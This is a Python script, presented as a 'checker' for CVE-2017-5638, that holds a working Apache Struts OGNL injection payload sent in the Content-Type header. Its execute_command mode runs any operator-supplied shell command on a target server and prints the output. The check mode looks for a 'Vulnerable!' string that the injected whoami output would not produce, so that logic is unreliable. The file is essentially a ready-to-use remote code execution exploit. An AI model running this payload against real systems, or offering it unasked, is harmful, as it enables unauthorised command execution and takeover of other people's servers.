import argparse
import requests

class CVE_2017_5638_Checker:
    def __init__(self, url):
        self.url = url

    def check_vulnerability(self):
        payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        headers = {
            'Content-Type': payload
        }

        response = requests.get(self.url, headers=headers)

        if response.status_code == 200 and 'Vulnerable!' in response.text:
            print("Status: Vulnerable!")
        else:
            print("Status: Not Vulnerable")

    def execute_command(self, command):
        payload = f"%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"

        headers = {
            'Content-Type': payload
        }

        response = requests.get(self.url, headers=headers)

        print(response.text)

def main():
    parser = argparse.ArgumentParser(description="CVE-2017-5638 Checker")
    parser.add_argument("--url", help="URL to check", required=True)
    parser.add_argument("--check", help="Check vulnerability", action="store_true")
    parser.add_argument("-c", "--command", help="Command to execute")

    args = parser.parse_args()

    if args.check:
        checker = CVE_2017_5638_Checker(args.url)
        checker.check_vulnerability()
    elif args.command:
        checker = CVE_2017_5638_Checker(args.url)
        checker.execute_command(args.command)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
